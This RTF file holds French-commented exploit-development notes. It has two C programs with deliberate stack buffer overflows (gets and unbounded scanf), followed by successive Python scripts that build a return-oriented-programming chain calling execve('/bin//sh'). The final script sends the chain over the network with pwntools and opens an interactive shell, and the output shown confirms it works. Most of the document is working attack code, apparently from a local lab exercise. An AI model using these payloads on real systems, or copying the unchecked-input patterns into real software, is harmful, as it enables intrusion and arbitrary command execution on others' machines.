{\rtf1\ansi\ansicpg1252\cocoartf1671\cocoasubrtf600
{\fonttbl\f0\fswiss\fcharset0 Helvetica;\f1\fswiss\fcharset0 ArialMT;\f2\fswiss\fcharset0 Arial-ItalicMT;
\f3\fswiss\fcharset0 Arial-BoldMT;\f4\fswiss\fcharset0 Helvetica-Oblique;}
{\colortbl;\red255\green255\blue255;}
{\*\expandedcolortbl;;}
\paperw11900\paperh16840\margl1440\margr1440\vieww10800\viewh8400\viewkind0
\deftab708
\pard\pardeftab708\ri-9\sl276\slmult1\partightenfactor0

\f0\fs22 \cf0 \
\pard\pardeftab708\ri-9\sl276\slmult1\partightenfactor0

\f1 \cf0 ```C\
#include <stdio.h>\
\
void main() \{\
\
	char buffer[50];\
	scanf("%s", buffer);\
	printf("%s", buffer);\
\
\}\
```\
\
\pard\pardeftab708\ri-9\sl276\slmult1\sa240\partightenfactor0

\f0 \cf0 \

\f1 #include <stdio.h>\
#include <stdlib.h>\
#include <string.h>\
\
\
int main(int argc, char ** argv) \{\
	char buffer[232];\
	int len, i;\
\
	gets(buffer);\
	len = strlen(buffer);\
\
	if (len >= 550) \{\
    	printf("Size too big :(\\n");\
    	exit(EXIT_FAILURE);\
	\}\
\
	for (i=0; i<len; i++) \{\
    	printf("%02x", buffer[i]);\
	\}\
\
	printf("\\n");\
	return 0;\

\f0 \}\
\
\pard\pardeftab708\ri-9\sl276\slmult1\sb240\sa240\partightenfactor0
\cf0 \
\
\
\pard\pardeftab708\ri-9\sl276\slmult1\sb240\sa240\partightenfactor0

\f2\i \cf0 #!/bin/env python3\
\pard\pardeftab708\ri-9\sl276\slmult1\sb240\sa240\partightenfactor0

\f3\i0\b \cf0 from
\f1\b0  struct 
\f3\b import
\f1\b0  pack\

\f3\b from
\f1\b0  os 
\f3\b import
\f1\b0  write\
\
pop_rax = pack("<Q", 0x4469d0)\
pop_rdi = pack("<Q", 0x40183a)\
pop_rsi = pack("<Q", 0x40788e)\
pop_rdx = pack("<Q", 0x47277b)\
movd_rsi_rax = pack("<Q", 0x470475)\
syscall = pack("<Q", 0x401213)\
at_data = pack("<Q", 0x4ab0e0)\
at_data_16 = pack("<Q", 0x4ab0e0+0x10)\
\
buff = 248 * b"A"\
\
write(1, buff)\
\pard\pardeftab708\ri-9\sl276\slmult1\sb240\sa240\partightenfactor0

\f0 \cf0 \
\pard\pardeftab708\ri-9\sl276\slmult1\sb240\sa240\partightenfactor0

\f2\i \cf0 #!/bin/env python3\
\pard\pardeftab708\ri-9\sl276\slmult1\sb240\sa240\partightenfactor0

\f3\i0\b \cf0 from
\f1\b0  struct 
\f3\b import
\f1\b0  pack\

\f3\b from
\f1\b0  os 
\f3\b import
\f1\b0  write\
\
pop_rax = pack("<Q", 0x4469d0)\
pop_rdi = pack("<Q", 0x40183a)\
pop_rsi = pack("<Q", 0x40788e)\
pop_rdx = pack("<Q", 0x47277b)\
movd_rsi_rax = pack("<Q", 0x470475)\
syscall = pack("<Q", 0x401213)\
at_data = pack("<Q", 0x4ab0e0)\
at_data_16 = pack("<Q", 0x4ab0e0+0x10)\
null = pack("<Q", 0x00)\
execve = pack("<Q", 59)\
\
buff = 248 * b"A"\
buff += pop_rsi\
buff += at_data\
buff += pop_rax\
buff += b"/bin//sh"\
buff += movd_rsi_rax\
buff += pop_rsi\
buff += at_data_16\
buff += pop_rax\
buff += at_data\
buff += movd_rsi_rax\
buff += pop_rdi\
buff += at_data\
buff += pop_rsi\
buff += at_data_16\
buff += pop_rdx\
buff += null\
buff += null\
buff += pop_rax\
buff += execve\
buff += syscall\
\
write(1, buff)\
write(1, b"\\n")\
\pard\pardeftab708\ri-9\sl276\slmult1\sb240\sa240\partightenfactor0

\f0 \cf0 \
\
\pard\pardeftab708\ri-9\sl276\slmult1\sb240\sa240\partightenfactor0

\f2\i \cf0 #!/bin/env python3\
\pard\pardeftab708\ri-9\sl276\slmult1\sb240\sa240\partightenfactor0

\f1\i0 \cf0 from struct import pack\
from os import write\
\
pop_rax = pack("<Q", 0x4469d0)\
pop_rdi = pack("<Q", 0x40183a)\
pop_rsi = pack("<Q", 0x40788e)\
pop_rdx = pack("<Q", 0x47277b)\
movd_rsi_rax = pack("<Q", 0x470475)\
syscall = pack("<Q", 0x401213)\
at_data = pack("<Q", 0x4ab0e0)\
at_data_16 = pack("<Q", 0x4ab0e0+0x10)\
at_data_24 = pack("<Q", 0x4ab0e0+0x18)\
null = pack("<Q", 0x00)\
execve = pack("<Q", 59)\
buff = 248 * b"A"\
\
""" parametrer le premier argument """\
buff += pop_rsi\
buff += at_data\
buff += pop_rax\
buff += b"/bin//sh"\
buff += movd_rsi_rax\
\
""" parametrer le deuxi\'e8me argument """\
buff += pop_rsi\
buff += at_data_16\
buff += pop_rax\
buff += at_data\
buff += movd_rsi_rax\
\
""" mettre le 2e pointeur du tableau des arguments \'e0 0 """\
buff += pop_rsi\
buff += at_data_24\
buff += pop_rax\
buff += null\
buff += movd_rsi_rax\
\
""" execve """\
buff += pop_rdi\
buff += at_data\
buff += pop_rsi\
buff += at_data_16\
buff += pop_rdx\
buff += null\
buff += null\
buff += pop_rax\
buff += execve\
buff += syscall\
\
write(1, buff)\
write(1, b"\\n") 
\f2\i # trigger
\f0\i0 \
\pard\pardeftab708\ri-9\sl276\slmult1\sb240\sa240\partightenfactor0

\f4\i \cf0 \
\
\pard\pardeftab708\ri-9\sl276\slmult1\sb240\sa240\partightenfactor0

\f2 \cf0 #!/bin/env python3\
\pard\pardeftab708\ri-9\sl276\slmult1\sb240\sa240\partightenfactor0

\f3\i0\b \cf0 from
\f1\b0  struct 
\f3\b import
\f1\b0  pack\

\f3\b from
\f1\b0  pwn 
\f3\b import
\f1\b0  remote\
\
proc = remote("127.0.0.1", 5555)\
\
pop_rax = pack("<Q", 0x4469d0)\
pop_rdi = pack("<Q", 0x40183a)\
pop_rsi = pack("<Q", 0x40788e)\
pop_rdx = pack("<Q", 0x47277b)\
movd_rsi_rax = pack("<Q", 0x470475)\
syscall = pack("<Q", 0x401213)\
at_data = pack("<Q", 0x4ab0e0)\
at_data_16 = pack("<Q", 0x4ab0e0+0x10)\
at_data_24 = pack("<Q", 0x4ab0e0+0x18)\
null = pack("<Q", 0x00)\
execve = pack("<Q", 59)\
buff = 248 * b"A"\
\
""" parametrer le premier argument """\
buff += pop_rsi\
buff += at_data\
buff += pop_rax\
buff += b"/bin//sh"\
buff += movd_rsi_rax\
\
""" parametrer le deuxi\'e8me argument """\
buff += pop_rsi\
buff += at_data_16\
buff += pop_rax\
buff += at_data\
buff += movd_rsi_rax\
\
""" mettre le 2e pointeur du tableau des arguments \'e0 0 """\
buff += pop_rsi\
buff += at_data_24\
buff += pop_rax\
buff += null\
buff += movd_rsi_rax\
\
""" execve """\
buff += pop_rdi\
buff += at_data\
buff += pop_rsi\
buff += at_data_16\
buff += pop_rdx\
buff += null\
buff += null\
buff += pop_rax\
buff += execve\
buff += syscall\
\
proc.sendline(buff)\
proc.interactive() 
\f2\i # et paf le shell\
\pard\pardeftab708\ri-9\sl276\slmult1\sb240\sa240\partightenfactor0

\f1\i0 \cf0 Plut\'f4t simple non ? \
Et du coup, pour confirmer que cela fonctionne toujours:\
> python tst.py\
[+] Opening connection to 127.0.0.1 on port 5555: Done\
[*] Switching to interactive mode\
$ id\
uid=1000(user) gid=1000(user) groups=1000(user)\
\pard\pardeftab708\ri-9\sl276\slmult1\partightenfactor0

\f0 \cf0 \
\
}